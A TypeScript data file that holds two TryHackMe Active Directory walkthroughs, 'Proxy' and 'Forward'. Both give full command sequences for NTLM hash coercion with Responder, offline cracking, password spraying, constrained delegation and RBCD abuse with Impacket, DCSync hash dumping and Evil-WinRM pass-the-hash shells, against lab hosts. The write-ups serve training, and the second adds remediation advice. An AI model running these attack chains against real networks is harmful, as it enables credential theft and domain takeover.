export interface Writeup {
  slug: string;
  title: string;
  excerpt: string;
  date: string;
  readTime: string;
  platformTag: "TryHackMe" | "BlockSec" | "Bug Bounty" | string;
  tags: string[];
  contentHtml: string;
}

export const writeups: Writeup[] = [
  {
    slug: "tryhackme-proxy-walkthrough",
    title: "TryHackMe: Proxy Walkthrough",
    excerpt: "End-to-end compromise of an Active Directory Domain Controller: anonymous SMB share discovery, NetNTLMv2 coercion with Responder, BloodHound mapping, and Kerberos Constrained Delegation exploitation.",
    date: "Oct 2026",
    readTime: "7 min",
    platformTag: "TryHackMe",
    tags: ["ActiveDirectory", "AD Pentesting"],
    contentHtml: `
      <b>Room Link: </b> <u><a href="https://tryhackme.com/room/proxychallenge" target="_blank" rel="noopener noreferrer">https://tryhackme.com/room/proxychallenge</a></u>
      <h2>Summary</h2>
      <p><strong>Proxy</strong> is an Active Directory machine on TryHackMe. The objective is to navigate an AD environment, intercept service credentials, and escalate to Domain Administrator through Kerberos abuse.</p>
      
      <ul>
        <li><strong>Recon:</strong> Fast port discovery with RustScan & Nmap fingerprinting (Ports 53, 88, 389, 445).</li>
        <li><strong>SMB Enumeration:</strong> Anonymous guest access to <code>IT-Shared</code> exposing staff onboarding notes.</li>
        <li><strong>Domain Graph Analysis:</strong> BloodHound enumeration discovering <code>AllowedToDelegate</code> on <code>svc.scanner</code>.</li>
        <li><strong>Privilege Escalation:</strong> Kerberos Constrained Delegation abuse with <code>Impacket-getST.py</code>, DCSync hash dumping, and WinRM shell.</li>
      </ul>

      <h2>1. Reconnaissance & Port Scanning</h2>
      <p>We initiate the assessment with <strong>RustScan</strong> to rapidly discover open ports, piping them directly to Nmap for service detection:</p>
      <pre><code>rustscan -a 10.114.168.198 -b 500 --top -- -sC -sV -oN Proxy</code></pre>
      
      <img src="/images/writeups/Proxy/rustscan.webp" alt="RustScan Port Discovery" class="rounded border border-border my-4 w-full" />
      <img src="/images/writeups/Proxy/rustscan-nmap.webp" alt="Nmap Service Scan" class="rounded border border-border my-4 w-full" />
      
      <p>The scan reveals a Windows Domain Controller (<strong>DC01.ctf.local</strong>):</p>
      <ul>
        <li><strong>Port 53:</strong> Microsoft DNS</li>
        <li><strong>Port 88:</strong> Kerberos (Domain Controller identifier)</li>
        <li><strong>Port 135:</strong> MSRPC</li>
        <li><strong>Port 389 / 3268:</strong> LDAP / Global Catalog</li>
        <li><strong>Port 445:</strong> SMB</li>
      </ul>

      <h2>2. SMB Share Enumeration & Host Entry</h2>
      <p>Using <strong>NetExec (nxc)</strong>, we test for null and guest SMB authentication:</p>
      <pre><code>nxc smb 10.114.168.198 -u 'guest' -p '' --shares</code></pre>
      
      <img src="/images/writeups/Proxy/nxc_smb_shares.webp" alt="SMB Shares Enumeration" class="rounded border border-border my-4 w-full" />
      
      <p>The target allows guest access to <code>IT-Shared</code> with <strong>READ and WRITE</strong> permissions. We connect interactively with <code>smbclient</code> and download all documents:</p>
      <pre><code>smbclient //10.114.168.198/IT-Shared -N
smb: \\> dir
smb: \\> mget *</code></pre>

      <img src="/images/writeups/Proxy/smb_share_data.webp" alt="SMB Shared Files" class="rounded border border-border my-4 w-full" />
      <img src="/images/writeups/Proxy/smb_share_data_file.png" alt="Inspecting Onboarding Checklist" class="rounded border border-border my-4 w-full" />

      <p>In <code>IT-Onboarding-Checklist.txt</code>, we uncover a crucial operational detail: <em>an automated scanner running under <code>svc.scanner</code> processes newly dropped files every 2 minutes</em>.</p>
      
      <p>We generate the <code>/etc/hosts</code> entry using NetExec:</p>
      <pre><code>nxc smb 10.114.168.198 -u 'guest' -p '' --generate-hosts-file host</code></pre>
      <img src="/images/writeups/Proxy/nxc_generate-host-file.webp" alt="Generate hosts entry" class="rounded border border-border my-4 w-full" />

      <h2>3. Credential Harvesting (Responder & John)</h2>
      <p>Since <code>svc.scanner</code> inspects new files, we can coerce an SMB authentication attempt by placing a PowerShell file that calls a UNC path pointing to our listener.</p>
      
      <p>Start Responder on the VPN tunnel interface:</p>
      <pre><code>sudo responder -I tun0 -dvw</code></pre>
      <img src="/images/writeups/Proxy/responder.webp" alt="Starting Responder" class="rounded border border-border my-4 w-full" />

      <p>We upload a one-line PowerShell script referencing our IP:</p>
      <pre><code>Get-ChildItem //192.168.131.251/t.txt</code></pre>
      <img src="/images/writeups/Proxy/smb_upload_file.webp" alt="Uploading script to SMB share" class="rounded border border-border my-4 w-full" />

      <p>Within 2 minutes, Responder catches the incoming NetNTLMv2 hash from <code>svc.scanner</code>:</p>
      <img src="/images/writeups/Proxy/got_the_hash.webp" alt="Captured NetNTLMv2 Hash" class="rounded border border-border my-4 w-full" />

      <p>We save the complete hash line and crack it offline using <strong>John the Ripper</strong>:</p>
      <pre><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
      <img src="/images/writeups/Proxy/john_crack_hash.webp" alt="Cracking Hash with John" class="rounded border border-border my-4 w-full" />

      <p>We verify the cracked credentials against the Domain Controller and list active users:</p>
      <pre><code>nxc smb 10.114.168.198 -u 'svc.scanner' -p '&lt;PASSWORD&gt;' --users</code></pre>
      <img src="/images/writeups/Proxy/nxc_smb_list_users.webp" alt="Verifying Credentials" class="rounded border border-border my-4 w-full" />

      <h2>4. Active Directory Graph Analysis (BloodHound)</h2>
      <p>With valid domain credentials, we run <code>bloodhound-python</code> to ingest domain objects, memberships, and ACLs:</p>
      <pre><code>bloodhound-python -u 'svc.scanner' -p '&lt;PASSWORD&gt;' -d ctf.local -dc DC01.ctf.local -ns 10.114.168.198 -c ALL --zip</code></pre>
      <img src="/images/writeups/Proxy/bloodhound_enum.webp" alt="BloodHound Ingestion" class="rounded border border-border my-4 w-full" />

      <p>Uploading the zip to BloodHound reveals that <code>svc.scanner</code> has <strong>AllowedToDelegate</strong> permissions targeting <code>cifs/DC01.ctf.local</code> on the Domain Controller:</p>
      <img src="/images/writeups/Proxy/bloodhound_enum_graph.png" alt="BloodHound Graph" class="rounded border border-border my-4 max-w-md mx-auto block shadow-sm" />
      <img src="/images/writeups/Proxy/bloodhound_enum_graph_abuse.png" alt="BloodHound Abuse Info" class="rounded border border-border my-4 max-w-md mx-auto block shadow-sm" />

      <h2>5. Privilege Escalation: Kerberos Constrained Delegation</h2>
      <h3>Why is Constrained Delegation Vulnerable?</h3>
      <p>Constrained Delegation allows a service account (<code>svc.scanner</code>) to impersonate users to a specific SPN (<code>cifs/DC01.ctf.local</code>).</p>
      <p>Using the Kerberos Service-for-User (S4U) extensions:</p>
      <ul>
        <li><strong>S4U2self:</strong> The account requests a Kerberos ticket to <em>itself</em> on behalf of any arbitrary domain user (including <code>Administrator</code>), without requiring that user's password.</li>
        <li><strong>S4U2proxy:</strong> The account then exchanges that ticket with the KDC for a valid service ticket to access the delegated target (<code>cifs/DC01.ctf.local</code>) as the impersonated user.</li>
      </ul>

      <p>We abuse this mechanism to forge a service ticket for <strong>Administrator</strong> using Impacket's <code>getST.py</code>:</p>
      <pre><code>impacket-getST ctf.local/svc.scanner:'&lt;PASSWORD&gt;' -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip DC01.ctf.local</code></pre>
      <img src="/images/writeups/Proxy/impacket-getST.webp" alt="Forging Ticket with getST" class="rounded border border-border my-4 w-full" />

      <p>We export the ticket into our shell session:</p>
      <pre><code>export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache</code></pre>
      <img src="/images/writeups/Proxy/export.webp" alt="Exporting KRB5CCNAME" class="rounded border border-border my-4 w-full" />

      <p>With administrative CIFS access, we perform a DCSync dump against the Domain Controller without requiring passwords (<code>-k -no-pass</code>):</p>
      <pre><code>impacket-secretsdump -k -no-pass ctf.local/Administrator@DC01.ctf.local</code></pre>
      <img src="/images/writeups/Proxy/impacket-secretdump.webp" alt="DCSync SecretsDump" class="rounded border border-border my-4 w-full" />

      <p>Secretsdump dumps the NTDS database, exposing the built-in Administrator NTLM hash. We gain an interactive administrative shell using <strong>Evil-WinRM</strong>:</p>
      <pre><code>evil-winrm -u Administrator -H &lt;ADMIN_NTLM_HASH&gt; -i 10.114.168.198</code></pre>
      <img src="/images/writeups/Proxy/evil-winrm.png" alt="Administrator Shell with Evil-WinRM" class="rounded border border-border my-4 w-full" />
    `,
  },
  {
    slug: "tryhackme-forward-walkthrough",
    title: "TryHackMe: Forward Walkthrough",
    excerpt: "Assumed breach Active Directory assessment: RDP pivoting, KeePass vault extraction, domain password spraying, and Domain Controller compromise via Resource-Based Constrained Delegation (RBCD).",
    date: "Oct 2026",
    readTime: "8 min",
    platformTag: "TryHackMe",
    tags: ["ActiveDirectory", "PrivEsc"],
    contentHtml: `
      <h2>1. Scenario: Assumed Breach</h2>
      <p>The engagement begins under an assumed breach model with low-privilege domain user credentials:</p>
      <pre><code>[ INITIAL ACCESS GRANTED ]
DOMAIN : ctf.local
USER   : ctf.local\\j.smith
PASS   : JSmith@IT2024</code></pre>
      
      <p>Target Domain Controller: <code>DC01.ctf.local</code> (<code>10.112.186.154</code>)</p>

      <h2>2. Initial Reconnaissance & Network Sweep</h2>
      <p>We initiate the assessment with <strong>RustScan</strong> to rapidly discover open ports, piping them directly to Nmap for service detection:</p>
      <pre><code>rustscan -a 10.112.186.154 -b 500 --top -- -sC -sV -Pn -oN Forward</code></pre>

      <img src="/images/writeups/Forward/rustscan.png" alt="RustScan Port Discovery" class="rounded border border-border my-4 w-full" />

      <p>The scan confirms a Windows-based Domain Controller (<strong>DC01.ctf.local</strong>):</p>
      <ul>
        <li><strong>Port 53:</strong> Microsoft DNS</li>
        <li><strong>Port 88:</strong> Kerberos</li>
        <li><strong>Port 135:</strong> MSRPC</li>
        <li><strong>Port 389:</strong> LDAP</li>
        <li><strong>Port 445:</strong> SMB</li>
      </ul>

      <img src="/images/writeups/Forward/rustscan+nmap.png" alt="Nmap Service Scan" class="rounded border border-border my-4 w-full" />

      <p>Using <strong>NetExec (nxc)</strong>, we authenticate as <code>j.smith</code> and generate the hosts mapping:</p>
      <pre><code>nxc smb 10.112.186.154 -u 'j.smith' -p 'JSmith@IT2024' --generate-hosts-file hosts</code></pre>
      <img src="/images/writeups/Forward/nxc_generat-hosts-file.png" alt="NetExec Generate Hosts" class="rounded border border-border my-4 w-full" />

      <p>We list the available shares and their permissions:</p>
      <pre><code>nxc smb DC01.ctf.local -d ctf.local -u 'j.smith' -p 'JSmith@IT2024' --shares</code></pre>
      <img src="/images/writeups/Forward/nxc_smb_shares-list.png" alt="SMB Shares List" class="rounded border border-border my-4 w-full" />

      <p>Connecting with <code>impacket-smbclient</code> shows that the accessible shares do not contain any actionable artifacts:</p>
      <pre><code>impacket-smbclient ctf.local/j.smith:'JSmith@IT2024'@ctf.local</code></pre>
      <img src="/images/writeups/Forward/impacket-smbclient_see-shares.png" alt="SMBClient Check Shares" class="rounded border border-border my-4 w-full" />

      <p>We export the list of domain users for future spraying:</p>
      <pre><code>nxc smb DC01.ctf.local -d ctf.local -u 'j.smith' -p 'JSmith@IT2024' --users-export users</code></pre>
      <img src="/images/writeups/Forward/nxc_smb_enum-users.png" alt="Enumerate Users" class="rounded border border-border my-4 w-full" />

      <h2>3. Active Directory Graph Enumeration (BloodHound)</h2>
      <p>We proceed with domain collection using <code>bloodhound-python</code>:</p>
      <pre><code>bloodhound-python -u 'j.smith' -p 'JSmith@IT2024' -d ctf.local -dc DC01.ctf.local -ns 10.112.186.154 -c All --zip</code></pre>
      <img src="/images/writeups/Forward/bloodhound_enum_zip.png" alt="BloodHound Ingestion Archive" class="rounded border border-border my-4 w-full" />
      <img src="/images/writeups/Forward/bloodhound_enum_fileupload.png" alt="Upload to BloodHound" class="rounded border border-border my-4 w-full" />

      <p>In BloodHound, we discover that <code>j.smith</code> is a member of the built-in <strong>REMOTE DESKTOP USERS</strong> group, permitting graphical remote login to the machine:</p>
      <img src="/images/writeups/Forward/bloodhound_enum_j.smith.png" alt="BloodHound j.smith Node" class="rounded border border-border my-4 w-full" />

      <h2>4. Lateral Movement: RDP Session & KeePass Discovery</h2>
      <p>We launch a remote desktop session using <code>xfreerdp</code>:</p>
      <pre><code>xfreerdp /u:j.smith /p:'JSmith@IT2024' /v:DC01.ctf.local /cert:ignore /dynamic-resolution</code></pre>
      <img src="/images/writeups/Forward/xfreerdp_connect1.png" alt="RDP Connection" class="rounded border border-border my-4 w-full" />

      <p>Searching the user directory in PowerShell reveals an encrypted KeePass database file:</p>
      <pre><code>Get-ChildItem -Path 'C:\\Users\\j.smith\\' -Recurse</code></pre>
      <img src="/images/writeups/Forward/rdp_data .png" alt="KeePass Database Found" class="rounded border border-border my-4 w-full" />

      <p>Opening KeePass 2, we authenticate using the Windows User Account option without entering a master password. The database reveals stored credentials for user <strong>t.jones</strong>:</p>
      <img src="/images/writeups/Forward/rdp_tjones.png" alt="KeePass t.jones Password" class="rounded border border-border my-4 w-full" />

      <p>We test the credentials using NetExec and authenticate as <code>t.jones</code>:</p>
      <pre><code>nxc smb DC01.ctf.local -d ctf.local -u 't.jones' -p '&lt;passwd&gt;' --shares</code></pre>
      <img src="/images/writeups/Forward/t-jones_smb_verfi.png" alt="NetExec t.jones Verification" class="rounded border border-border my-4 w-full" />

      <h2>5. Lateral Movement: Password Spraying</h2>
      <p>With valid credentials for <code>t.jones</code>, we spray the password across the harvested domain user list:</p>
      <pre><code>nxc smb DC01.ctf.local -d ctf.local -u users -p '&lt;passwd&gt;' --continue-on-success</code></pre>
      <img src="/images/writeups/Forward/nxc_passwd_spray.png" alt="Password Spray Results" class="rounded border border-border my-4 w-full" />

      <p><strong>Result:</strong> <code>r.williams</code> shares the exact same password as <code>t.jones</code>!</p>

      <h2>6. Escalate Privileges: Resource-Based Constrained Delegation (RBCD)</h2>
      <p>In BloodHound, we inspect the outbound permissions for <strong>r.williams</strong> and find the <strong>AddAllowedToAct</strong> edge over the Domain Controller:</p>
      <img src="/images/writeups/Forward/bloodhound_rwilliams.png" alt="BloodHound r.williams AddAllowedToAct" class="rounded border border-border my-4 max-w-md mx-auto block shadow-sm" />

      <h3>Understanding RBCD vs. Traditional Constrained Delegation</h3>
      <ul>
        <li><strong>Traditional Constrained Delegation:</strong> Configured on the front-end service account (<code>msDS-AllowedToDelegateTo</code>) by a Domain Admin.</li>
        <li><strong>Resource-Based Constrained Delegation:</strong> Configured directly on the target resource (<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>). Anyone with write access over the target computer can configure which accounts are allowed to impersonate users to it.</li>
      </ul>

      <p><strong>Step 1:</strong> We create a new machine account (<code>SYS$</code>) in the domain using <code>r.williams</code>' credentials:</p>
      <pre><code>impacket-addcomputer ctf.local/r.williams:'&lt;passwd&gt;' -computer-name SYS$ -computer-pass '&lt;passwd&gt;' -dc-ip DC01.ctf.local</code></pre>
      <img src="/images/writeups/Forward/impacket-addaccont.png" alt="Impacket Add Computer" class="rounded border border-border my-4 w-full" />

      <p><strong>Step 2:</strong> We write our controlled <code>SYS$</code> machine account into the DC's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute:</p>
      <pre><code>impacket-rbcd ctf.local/r.williams:'&lt;passwd&gt;' -dc-ip DC01.ctf.local -delegate-from 'SYS$' -delegate-to 'DC01$' -action 'write'</code></pre>
      <img src="/images/writeups/Forward/impacket-rbcd.png" alt="Impacket RBCD Write" class="rounded border border-border my-4 w-full" />

      <p><strong>Step 3:</strong> Using <code>SYS$</code>, we abuse S4U2Self and S4U2Proxy to request a Kerberos service ticket for <code>cifs/DC01.ctf.local</code> while impersonating <strong>Administrator</strong>:</p>
      <pre><code>impacket-getST -dc-ip DC01.ctf.local -spn cifs/DC01.ctf.local -impersonate Administrator ctf.local/SYS$:'&lt;passwd&gt;'</code></pre>
      <img src="/images/writeups/Forward/impacket-getST.png" alt="Impacket getST Impersonate" class="rounded border border-border my-4 w-full" />

      <p>We export the ticket into our environment:</p>
      <pre><code>export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache</code></pre>

      <p><strong>Step 4:</strong> We execute DCSync against the Domain Controller using the Kerberos ticket:</p>
      <pre><code>impacket-secretsdump -k -no-pass ctf.local/Administrator@DC01.ctf.local</code></pre>
      <img src="/images/writeups/Forward/impacket-secrets.png" alt="SecretsDump DCSync" class="rounded border border-border my-4 w-full" />

      <h2>7. Gaining Shell & Capturing the Flag</h2>
      <p>With the Administrator NTLM hash obtained, we authenticate over WinRM using <strong>Evil-WinRM</strong>:</p>
      <pre><code>evil-winrm -u Administrator -H &lt;hash&gt; -i DC01.ctf.local</code></pre>
      <img src="/images/writeups/Forward/evil-winrm.png" alt="Evil-WinRM Administrator Shell" class="rounded border border-border my-4 w-full" />

      <p>Locate and capture the final flag:</p>
      <pre><code>Get-ChildItem -Path "C:\\Users\\Administrator" -Filter "*.txt" -Recurse</code></pre>

      <h2>8. Key Takeaways & Remediation</h2>
      <ul>
        <li><strong>Audit ACLs on Computer Objects:</strong> Restrict write permissions on Domain Controllers to Domain Admins only. Helpdesk and standard users should never hold <code>GenericWrite</code> or <code>WriteProperty</code> on tier-0 assets.</li>
        <li><strong>Set MachineAccountQuota to 0:</strong> Prevent unprivileged domain users from joining new computer accounts to the domain.</li>
        <li><strong>Enforce Unique Passwords:</strong> Disallow password reuse across users to mitigate horizontal spraying attacks.</li>
        <li><strong>Protect High-Privilege Accounts:</strong> Add Domain Admins to the <em>Protected Users</em> group to prevent Kerberos delegation impersonation.</li>
      </ul>
    `,
  },
];
